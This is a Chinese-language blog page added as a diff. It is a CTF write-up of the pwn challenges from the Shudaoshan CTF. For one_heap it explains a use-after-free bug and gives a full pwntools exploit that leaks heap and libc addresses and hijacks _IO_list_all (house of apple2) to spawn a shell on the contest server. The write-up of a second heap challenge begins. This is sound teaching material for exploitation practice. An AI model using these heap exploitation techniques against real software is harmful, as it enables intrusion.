@@ -1,0 +1,813 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bug.png">
+  <link rel="icon" href="/img/bug.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#453B40">
+  <meta name="author" content="ZLSF">
+  <meta name="keywords" content="ZLSF,zlsf">
+  
+    <meta name="description" content="one_heap​	check：  ​	题目保护全开 ​	漏洞点： ​	1.  ​	uaf漏洞。 ​	2.  ​	输出指向当前堆块的地址（而非堆块的内容）。 ​	思路： ​	题目只允许一次操作一个堆块，但是我们可以通过magic函数来造成tcachebin的uaf，释放任意一堆块获得heap的基地址，通过tcatche的uaf申请到tcachebin的开头（也就是堆块的起始地址这个位置，这里记录了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蜀道山CTF-PWN全解WP">
+<meta property="og:url" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/index.html">
+<meta property="og:site_name" content="ZLSF的博客">
+<meta property="og:description" content="one_heap​	check：  ​	题目保护全开 ​	漏洞点： ​	1.  ​	uaf漏洞。 ​	2.  ​	输出指向当前堆块的地址（而非堆块的内容）。 ​	思路： ​	题目只允许一次操作一个堆块，但是我们可以通过magic函数来造成tcachebin的uaf，释放任意一堆块获得heap的基地址，通过tcatche的uaf申请到tcachebin的开头（也就是堆块的起始地址这个位置，这里记录了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428396401.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428501259.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428563665.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429573460.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732430033359.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429645955.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431244048.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431311058.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431732423.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431818549.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431867320.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431916114.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432521110.png">
+<meta property="og:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432587514.png">
+<meta property="article:published_time" content="2024-11-24T05:57:44.000Z">
+<meta property="article:modified_time" content="2024-11-24T07:20:12.528Z">
+<meta property="article:author" content="ZLSF">
+<meta property="article:tag" content="ZLSF,zlsf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zlsf-zl.github.io/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428396401.png">
+  
+  
+  
+  <title>蜀道山CTF-PWN全解WP - ZLSF的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zlsf-zl.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"6qfbMdW9PFOPATbmhAiyPWcK-MdYXbMMI","app_key":"X9xyyWbc7hafcwTqYXwdhjE5","server_url":"https://6qfbmdw9.api.lncldglobal.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ZLSF的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/start.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="蜀道山CTF-PWN全解WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-24 13:57" pubdate>
+          2024年11月24日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">蜀道山CTF-PWN全解WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="one-heap"><a href="#one-heap" class="headerlink" title="one_heap"></a><strong>one_heap</strong></h3><p>​	check：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428396401.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	题目保护全开</p>
+<p>​	漏洞点：</p>
+<p>​	1.</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428501259.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	uaf漏洞。</p>
+<p>​	2.</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732428563665.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	输出指向当前堆块的地址（而非堆块的内容）。</p>
+<p>​	思路：</p>
+<p>​	题目只允许一次操作一个堆块，但是我们可以通过magic函数来造成tcachebin的uaf，释放任意一堆块获得heap的基地址，通过tcatche的uaf申请到tcachebin的开头（也就是堆块的起始地址这个位置，这里记录了tcache堆块的所有信息，我们可以修改这个地方影响tcachebin的行为）。</p>
+<p>​	通过修改堆块0x290的数量为7，释放tcachebin头进入unsortbins，此时堆中出现了libc的地址，申请合适的堆块来让这个libc地址到0x100的范围中，通过申请0xF8可以将堆块申请到这个libc地址上（不能将unsortbin构造到其他地址是因为高libc版本会有加密，加密后申请是必不会成功的）。</p>
+<p>​	通过magic输出libc的地址后可得libc的基地址。</p>
+<p>​	通过正常的tcachebin attack劫持_IO_list_all到堆中打house of apple2即可完成攻击。</p>
+<p>​	exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;gamebox.yunyansec.com&quot;</span>, <span class="hljs-number">32121</span>)<br><span class="hljs-comment">#p = process(&quot;./heap&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size:\n&quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;context:\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>():<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">3</span>))<br><br>add(<span class="hljs-number">0xF8</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x20</span>)<br>dele()<br><br>show()<br>rel()<br>heap_base = u64(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x2a0</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br>key = heap_base &gt;&gt; (<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)<br>ph(key,<span class="hljs-string">&quot;key&quot;</span>)<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0xB8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0xA8</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x98</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br>add(<span class="hljs-number">0x78</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele()<br><br>fake_addr = (heap_base+<span class="hljs-number">0x10</span>) ^ key<br>add(<span class="hljs-number">0xF8</span>,p64(fake_addr))<br>add(<span class="hljs-number">0xF8</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">0xF8</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">1</span> + p64(<span class="hljs-number">0x1000100000000</span>) + p64(<span class="hljs-number">0x1000100010001</span>) + p64(<span class="hljs-number">0x100000000</span>) + p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x7000000000000</span>))<br><br>dele()<br>add(<span class="hljs-number">0xE8</span>,p64(<span class="hljs-number">0</span>))<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>add(<span class="hljs-number">0xE8</span>,p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">1</span> + p64(<span class="hljs-number">0x1000100000000</span>) + p64(<span class="hljs-number">0x1000100010001</span>) + p64(<span class="hljs-number">0x100000000</span>) + p64(<span class="hljs-number">0x0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x7000000000000</span>))<br>add(<span class="hljs-number">0xF8</span>,p64(<span class="hljs-number">0</span>))<br><br>show()<br><br>rel()<br>libc_base = raddr64() - <span class="hljs-number">0x203b20</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br><br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&quot;_IO_list_all&quot;</span>]<br>io_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">0x8</span>)<br><br>dele()<br>show()<br>dele()<br>show()<br>dele()<br>show()<br>dele()<br><br>fake_addr = (IO_list_all) ^ key<br>add(<span class="hljs-number">0xC8</span>,p64(fake_addr))<br>fakeio1 = p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&quot;;sh\x00&quot;</span> + p64(<span class="hljs-number">0x0</span>)<br>fakeio1+= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fakeio1+= p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>fakeio1+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x70</span> + p64(heap_base + <span class="hljs-number">0x500</span>)<br>fakeio1+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span><br>add(<span class="hljs-number">0xC8</span>,fakeio1)<br>add(<span class="hljs-number">0xC8</span>,p64(heap_base + <span class="hljs-number">0x3a0</span>))<br>fakeio2 = p64(<span class="hljs-number">0</span>) + p64(io_wfile_jumps)<br>fakeio2+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x78</span><br>add(<span class="hljs-number">0xB8</span>,fakeio2)<br>fakeio3 = <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x68</span><br>add(<span class="hljs-number">0xA8</span>,fakeio3)<br>fakeio4 = p64(heap_base + <span class="hljs-number">0x600</span> ) + p64(<span class="hljs-number">0</span>)<br>fakeio4+= <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x78</span> + p64(sys_addr)<br>add(<span class="hljs-number">0x98</span>,fakeio4)<br><br>sela(<span class="hljs-string">b&quot;choice: \n&quot;</span>,stre(<span class="hljs-number">6</span>))<br><br>op()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="small-stmashing"><a href="#small-stmashing" class="headerlink" title="small stmashing"></a><strong>small stmashing</strong></h3><p>​	check:</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429573460.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	沙盒：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732430033359.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	NX保护开启，RELRO半开。</p>
+<p>​	漏洞点：</p>
+<p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732429645955.png" srcset="/img/loading.gif" lazyload></p>
+<p>​	存在uaf漏洞。</p>
+<p>​	思路：</p>
+<p>​	我们最多可以持有33个堆块，我们只能持有0x78到0x3F8之间的堆块。</p>
+<p>​	add函数使用了calloc，该函数的特点就是不会从tcachebins中获取堆块。</p>
+<p>​	我们先通过9次申请0x288然后再释放，此时会有unsortbins出现，我们可以同时获得堆基地址（add函数会输出堆地址）和libc基地址。</p>
